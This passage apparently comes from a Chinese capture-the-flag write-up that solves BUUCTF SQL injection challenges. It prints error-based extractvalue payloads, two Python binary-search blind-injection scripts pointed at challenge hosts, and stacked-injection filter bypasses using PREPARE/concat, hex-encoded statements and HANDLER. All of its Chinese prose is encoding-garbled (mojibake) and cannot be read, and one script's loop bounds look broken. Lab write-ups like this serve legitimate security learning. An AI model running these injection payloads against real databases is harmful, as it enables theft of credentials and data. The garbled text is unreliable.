<code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)))))#</code>ï¼Œè·å¾—è¡¨åã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/QPlhbUB0totaT5xuGQWcgb42nDh.png"></p><p>ç¨ä½œä¿®æ”¹ï¼Œç»§ç»­è¾“å…¥ <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))#</code>ï¼Œè·å¾—åˆ—åã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Be9PbyEnAoovDnxikzQcsfb0nBc.png"></p><p>ç¨ä½œä¿®æ”¹ï¼Œç»§ç»­è¾“å…¥ <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(username,0x7e,password))from(geek.H4rDsq1)))))#</code>ï¼Œè·å¾— username å’Œ password åˆ—çš„å†…å®¹ã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Em56bWLD5oa4vxxfiFfcoaiinzx.png"></p><p>æ˜¾ç¤ºä¸å®Œå…¨ï¼Œç”¨ <code>substring(str,num1,num2)</code> å‡½æ•°è°ƒæ•´ä½ç½®ï¼Œç»“æœå‘ç°è¿™ä¸ªä¹Ÿè¿‡æ»¤äº†ï¼Œæ¢ç”¨ <code>right</code> å°è¯• <code>1&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(username,0x7e,password))from(geek.H4rDsq1)),30))))#</code>ï¼ŒæˆåŠŸï¼Œæ‹¼æ¥å³å¾— flagã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/UfYgb6VlWo2S67xoN8GctLwqn2g.png"></p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h1><p>ç™»å½•æ æµ‹äº†ä¸€ä¸‹åŸºæœ¬éƒ½è¿‡æ»¤äº†ï¼Œé€‰æ‹©æ­£ç¡®ä»£ç å‘ç°å­˜åœ¨æ³¨å…¥ï¼Œä½†æ˜¯ unionã€andã€ç©ºæ ¼è¿™äº›è¿‡æ»¤äº†å¤§éƒ¨åˆ†ï¼Œè€Œä¸”æ²¡æœ‰å›æ˜¾ä½ï¼Œåº”è¯¥å°±æ˜¯è€ƒå¸ƒå°”ç›²æ³¨ã€‚ç”¨ python è„šæœ¬äºŒåˆ†æ³•å»è·‘ç»“æœ</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br>import re<br>import <span class="hljs-built_in">time</span><br><br>url = <span class="hljs-string">&quot;http://df6d4f70-e3c4-46b8-86fb-7d59ae29eb14.node5.buuoj.cn:81/search.php?id=&quot;</span><br>x = <span class="hljs-number">7</span><br>payloads = [<br>    <span class="hljs-comment"># åº“é•¿ 0</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># åº“å 1</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># è¡¨é•¿ 2</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># è¡¨å 3</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># åˆ—é•¿ 4</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># åˆ—å 5</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># å†…å®¹ 7</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span><br>]<br><br>method=<span class="hljs-number">0</span><br><br>keywords = <span class="hljs-string">&quot;ERROR&quot;</span><span class="hljs-comment">#&quot;Click others&quot;</span><br><br>def boolean_query(url,payload):<br>    <span class="hljs-keyword">if</span> method == <span class="hljs-number">0</span>:<br>        r = requests.<span class="hljs-built_in">get</span>(url + payload)<br>    elif method == <span class="hljs-number">1</span>:<br>        r = requests.<span class="hljs-built_in">post</span>(url, payload)<br>    elif method == <span class="hljs-number">2</span>:<br>        r = requests.<span class="hljs-built_in">post</span>(url, json=payload)<br>    <span class="hljs-literal">return</span> keywords <span class="hljs-keyword">in</span> r.<span class="hljs-keyword">text</span>  <span class="hljs-comment"># è¿™é‡Œåˆ¤æ–­é¡µé¢æ˜¯å¦å­˜åœ¨å…³é”®å­—</span><br><br>def get_length(url,payload):<br>    <span class="hljs-keyword">if</span> payload == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-literal">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> boolean_query(url,payload):<br>            <span class="hljs-literal">return</span> i<br>    <span class="hljs-literal">return</span> <span class="hljs-number">0</span><br><br>def get_name(url,<span class="hljs-built_in">length</span>,payload):<br>    results=[]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">length</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">length</span> = <span class="hljs-number">400</span><br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">170</span>,<span class="hljs-built_in">length</span>+<span class="hljs-number">1</span>):<br>        low, high = <span class="hljs-number">32</span>, <span class="hljs-number">126</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>            tmp_payload = payload.<span class="hljs-built_in">format</span>(i=i,<span class="hljs-keyword">mid</span>=<span class="hljs-keyword">mid</span>)<br>            <span class="hljs-keyword">if</span> boolean_query(url,tmp_payload):<br>                low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">if</span> low == <span class="hljs-number">32</span>:  <span class="hljs-comment"># ASCII 32 = ç©ºæ ¼ï¼Œè¡¨ç¤ºç»“æŸ</span><br>            break<br>        name += chr(low)<br>        print(chr(low),<span class="hljs-keyword">end</span>=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-literal">return</span> name<br><br>payload = payloads[x]<br><span class="hljs-built_in">length</span> = get_length(url,payload)<br><span class="hljs-built_in">result</span> = get_name(url,<span class="hljs-built_in">length</span>,payload)<br>print(f<span class="hljs-string">&quot;\n[+] Found : &#123;result&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>å…ˆè·‘æ‰€æœ‰æ•°æ®åº“å</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/ZWFubIQemoP1duxlppvcvHzSnrd.png"></p><p>ç„¶åè·‘å‡º geek åº“çš„è¡¨å</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Uuffb5xTxo7EsbxoYWfc0iy7nRc.png"></p><p>ç„¶åè·‘å‡º geek åº“ Flaaaaag è¡¨çš„åˆ—å</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Udu9bk5OcoclUxxS6BYcWykInmc.png"></p><p>ç„¶åå‘ç°è¢«éª—äº†</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/H6aYbClnJoIjYmxPEqUcs7gLnTg.png"></p><p>æ¢ F1naI1y è¡¨è·‘ï¼Œå¤§æ¦‚å°±è¿™æ ·ï¼Œå†…å®¹éƒ¨åˆ†æœ‰é”™è¯¯ã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/WQ3sb0fGRoDaZIxTsctc3Pz0n0K.png"></p><h1 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h1><p>è¾“å…¥ 1ã€2 å‡æœ‰ç»“æœï¼Œç©ºæ ¼ã€+ è¢«è¿‡æ»¤ï¼Œå‘ç° %20 å¯æ›¿ä»£ï¼Œandã€orã€unionã€informationã€(groupã€%20groupã€å‡è¿‡æ»¤ã€‚</p><p>ç»¼åˆè€ƒè™‘ï¼Œå¯ä»¥ç”¨ concat()ä»£æ›¿ group_concat()ï¼Œç©ºæ ¼æ²¿ç”¨å‰é¢ä¸€é¢˜çš„æ‹¬å·ï¼Œinformation å¯ä»¥æ”¹ç”¨ sys.schema_auto_increment_columns æŸ¥è¡¨ï¼Œä½†æ˜¯å†ä¸€çœ‹é¢˜ç›®å·²ç»ç»™å‡º flag æ‰€åœ¨è¡¨å’Œåˆ—äº†ï¼Œé‚£å°±ç›´æ¥çˆ†å°±å¥½äº†ã€‚æŒ‰æˆ‘çš„æ³¨å…¥è¯­å¥æ¥è¯´ï¼Œå½“ Hello, glzjin wants a girlfriend.å‡ºç°çš„æ—¶å€™å³åˆ¤æ–­æ­£ç¡®ï¼ŒError Occured When Fetch Result.å‡ºç°å³åˆ¤æ–­é”™è¯¯ï¼Œå…¶ä»–å³æ³¨å…¥è¯­å¥æœ¬èº«æœ‰è¯¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://23f0fee2-b6ad-4a70-88b9-b13213bde7f9.node5.buuoj.cn:81/index.php&quot;</span><br><br>x = <span class="hljs-number">7</span><br>payloads = [<br>    <span class="hljs-comment"># åº“é•¿ 0</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># åº“å 1</span><br>    <span class="hljs-string">&quot;0^(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># è¡¨é•¿ 2</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># è¡¨å 3</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># åˆ—é•¿ 4</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># åˆ—å 5</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># å†…å®¹ 7</span><br>    <span class="hljs-string">&quot;0^(ascii(substr((select(concat(flag))from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span><br>]<br><br>method=<span class="hljs-number">1</span>               <span class="hljs-comment"># get:0  post+url:1  post+json:2</span><br>parameters_url=&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;        <span class="hljs-comment"># method=1</span><br>target_url=<span class="hljs-string">&quot;id&quot;</span>                 <span class="hljs-comment"># method=1</span><br>parameters_json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;      <span class="hljs-comment"># method=2</span><br>target_json=<span class="hljs-string">&quot;username&quot;</span>                             <span class="hljs-comment"># method=2</span><br><br>keywords = <span class="hljs-string">&quot;glzjin&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boolean_query</span>(<span class="hljs-params">url,payload</span>):<br>    <span class="hljs-keyword">if</span> method == <span class="hljs-number">0</span>:<br>        r = requests.get(url + payload)<br>    <span class="hljs-keyword">elif</span> method == <span class="hljs-number">1</span>:<br>        parameters_url[target_url] = payload<br>        r = requests.post(url, data=parameters_url)<br>    <span class="hljs-keyword">elif</span> method == <span class="hljs-number">2</span>:<br>        parameters_json[target_json]=payload<br>        r = requests.post(url, json=parameters_json)<br>    <span class="hljs-keyword">return</span> keywords <span class="hljs-keyword">in</span> r.text  <span class="hljs-comment"># è¿™é‡Œåˆ¤æ–­é¡µé¢æ˜¯å¦å­˜åœ¨å…³é”®å­—</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">url,payload</span>):<br>    <span class="hljs-keyword">if</span> payload == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> boolean_query(url,payload):<br>            <span class="hljs-keyword">return</span> i<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name</span>(<span class="hljs-params">url,length,payload</span>):<br>    results=[]<br>    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span>:<br>        length = <span class="hljs-number">400</span><br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):<br>        low, high = <span class="hljs-number">32</span>, <span class="hljs-number">126</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            tmp_payload = payload.<span class="hljs-built_in">format</span>(i=i,mid=mid)<br>            <span class="hljs-keyword">if</span> boolean_query(url,tmp_payload):<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low == <span class="hljs-number">32</span>:  <span class="hljs-comment"># ASCII 32 = ç©ºæ ¼ï¼Œè¡¨ç¤ºç»“æŸ</span><br>            <span class="hljs-keyword">break</span><br>        name += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(low),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> name<br><br>payload = payloads[x]<br>length = get_length(url,payload)<br>result = get_name(url,length,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] Found : <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹å…ˆæŸ¥äº†æ•°æ®åº“ï¼Œåé¢å‘ç°æ²¡å¿…è¦</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/SThibFGh1oDzufxI7Flcvf0hnAe.png"></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/GyP3byDCsoSIwIxCzVhc7X5KnTg.png"></p><h1 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h1><p>åˆšå­¦ï¼Œå…ˆç”¨ BP å’Œç›¸å…³å­—å…¸ fuzz ä¸€ä¸‹ï¼Œå¯ä»¥æ¯”è¾ƒé«˜æ•ˆåœ°æ¢æµ‹å“ªäº›å‡½æ•°ã€å…³é”®å­—ã€ç¬¦å·ä¸å¯ç”¨</p><p>ä¾‹å¦‚æœ¬é¢˜å½“è¾“å…¥ <code>select</code> æ—¶ç›´æ¥ç»™å‡ºäº†è¿‡æ»¤çš„èŒƒå›´ï¼Œè”åˆæ³¨å…¥å¯ä»¥æ’é™¤</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Lan7bHQDHoQ3ZjxZfkuchz97nbd.png"></p><p>è¾“å…¥ <code>1 or 1=1</code> æ—¶èƒ½æ­£å¸¸å›æ˜¾</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/T2uWbq5ePoqP3mxBp8OcFk7JnSg.png"></p><p>è¾“å…¥ <code>1&#39; or &#39;1&#39;=&#39;1</code> æ—¶åŒæ ·æ­£å¸¸</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/IYEpbtlTPoe8BJxOxUccDGYnnhp.png"></p><p>è¿™ä¸ªæ—¶å€™åˆ™ä¼šæŠ¥é”™</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/W9kabh3tTo0Vzqx8uRbconPAn1e.png"></p><p>è¯´æ˜åé¢è¿˜æœ‰æŸ¥è¯¢è¯­å¥ï¼Œä»¥å•å¼•å·é—­åˆï¼Œæ‰€ä»¥åé¢è¿˜è¦è¡¥ä¸Šæ³¨é‡Šç¬¦ <code>1&#39; or 1=1#</code>ï¼Œæ­¤æ—¶æ˜¾ç¤ºäº†æ‰€æœ‰å†…å®¹</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/H45dbqPdvoQqrqxcB9GcFtednRf.png"></p><p>æ¥ä¸‹æ¥å°è¯•å †å æ³¨å…¥ï¼Œè¦é¿å…ç›´æ¥ä½¿ç”¨ select å’Œ whereï¼Œ<code>1&#39;;show databases;#</code> æŸ¥çœ‹æ•°æ®åº“</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/A7nFbsJaroJVDDxMSlkcrG6anXr.png"></p><p>ç»§ç»­æŸ¥çœ‹è¡¨ <code>1&#39;;show tables;#</code></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/HScpbJe1SofO5vxYmuvcMersn0d.png"></p><p>æ¥ä¸‹æ¥æŸ¥çœ‹åˆ—å¯ä»¥ä½¿ç”¨ <code>1&#39;; show columns from tableName;#</code> æˆ– <code>1&#39;;desc tableName;#</code>ã€‚æ³¨æ„ï¼Œ<u>å¦‚æœ tableName æ˜¯çº¯æ•°å­—ï¼Œéœ€è¦ç”¨åå¼•å·</u>&#96;&#96;&#96;<u>åŒ…è£¹</u>ï¼Œæ‰€ä»¥è¾“å…¥ <code>1&#39;;desc </code> 1919810931114514 <code>;#</code></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/EdW7blyC1oBOcGxwqCkcWCQrntg.png"></p><p>å¾—åˆ°åˆ—ååæƒ³è¦è·å–å…·ä½“å†…å®¹ä¸€èˆ¬éƒ½éœ€è¦ä¾é  select å’Œ whereï¼Œè¿™é‡Œå‚è€ƒåˆ«äººæ€»ç»“çš„å››ç§æ–¹æ³•å­¦ä¹ å°è¯•ä¸€ä¸‹</p><h2 id="æ–¹æ³•ä¸€ï¼šé¢„ç¼–è¯‘-å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"><a href="#æ–¹æ³•ä¸€ï¼šé¢„ç¼–è¯‘-å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡" class="headerlink" title="æ–¹æ³•ä¸€ï¼šé¢„ç¼–è¯‘ + å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"></a>æ–¹æ³•ä¸€ï¼šé¢„ç¼–è¯‘ + å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h2><p>é€šè¿‡é¢„ç¼–è¯‘çš„æ–¹å¼æ‹¼æ¥ select å…³é”®å­—ï¼š<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from </code> 1919810931114514 <code> &#39;);EXECUTE hacker;#</code>ã€‚é¢„ç¼–è¯‘ç›¸å½“äºå®šä¸€ä¸ªè¯­å¥ç›¸åŒï¼Œå‚æ•°ä¸åŒçš„ Mysql æ¨¡æ¿ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é¢„ç¼–è¯‘çš„æ–¹å¼ï¼Œç»•è¿‡ç‰¹å®šçš„å­—ç¬¦è¿‡æ»¤ã€‚ä¹‹å‰æœ‰å­¦ä¹ è¿‡é€šè¿‡é¢„ç¼–è¯‘é˜²å¾¡ SQL æ³¨å…¥æ”»å‡»ï¼Œä½†è¿™æ˜¯ç¬¬ä¸€æ¬¡ç”¨é¢„ç¼–è¯‘æ¥ç»•è¿‡é˜²æŠ¤ã€‚</p><p>é¢„ç¼–è¯‘çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> åç§° <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Sql</span>è¯­å¥ ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> åç§° <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼šæ­£å¸¸æŸ¥è¯¢ä½¿ç”¨ <code>SElECT * FROM t_user WHERE USER_ID = 1</code>ï¼Œé¢„ç¼–è¯‘åˆ™å¯ä»¥å¦‚ä¸‹æ“ä½œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">æ–¹æ³•ä¸€ï¼š<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>æ–¹æ³•äºŒï¼š<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>æ–¹æ³•ä¸‰ï¼š<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure><p>æœ¬é¢˜å› ä¸ºå¯ä»¥å †å æ³¨å…¥ä¸”è¿‡æ»¤äº† select å…³é”®å­—ï¼Œæ‰€ä»¥å…ˆå°†å…³é”®å­—æ‹†å¼€é€šè¿‡ concat æ–¹æ³•æ‹¼æ¥å¹¶é¢„ç¼–è¯‘ï¼Œæ¥ç»•è¿‡æ£€æµ‹ï¼Œç„¶åå†æ‰§è¡Œé¢„ç¼–è¯‘å¥½çš„æŸ¥è¯¢è¯­å¥è·å– flagã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/D3TEbhvlPopwvIxQkQ7cVK9gnzN.png"></p><h2 id="æ–¹æ³•äºŒï¼šé¢„ç¼–è¯‘-åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡"><a href="#æ–¹æ³•äºŒï¼šé¢„ç¼–è¯‘-åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡" class="headerlink" title="æ–¹æ³•äºŒï¼šé¢„ç¼–è¯‘ + åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡"></a>æ–¹æ³•äºŒï¼šé¢„ç¼–è¯‘ + åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡</h2><p>å¯ä»¥ç›´æ¥å°† <code>select * from </code> 1919810931114514&#96;&#96; è¯­å¥è¿›è¡Œ 16 è¿›åˆ¶ç¼–ç ï¼Œå³ï¼š<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>ï¼Œæ›¿æ¢ payload é¢„ç¼–è¯‘ï¼š</p><p><code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</code></p><p>åŸºæœ¬åŸç†åŒä¸Š</p><h2 id="æ–¹æ³•ä¸‰ï¼šhandler-æ›¿æ¢-selectï¼ˆä»…-MySQLï¼‰"><a href="#æ–¹æ³•ä¸‰ï¼šhandler-æ›¿æ¢-selectï¼ˆä»…-MySQLï¼‰" class="headerlink" title="æ–¹æ³•ä¸‰ï¼šhandler æ›¿æ¢ selectï¼ˆä»… MySQLï¼‰"></a>æ–¹æ³•ä¸‰ï¼šhandler æ›¿æ¢ selectï¼ˆä»… MySQLï¼‰</h2><p><code>1&#39;;HANDLER </code> 1919810931114514 <code>OPEN;HANDLER</code> 1919810931114514 <code>READ FIRST;HANDLER</code> 1919810931114514 <code> CLOSE;#</code> ç›´æ¥è·å– flag</p><p>mysql é™¤å¯ä½¿ç”¨ select æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨ handler 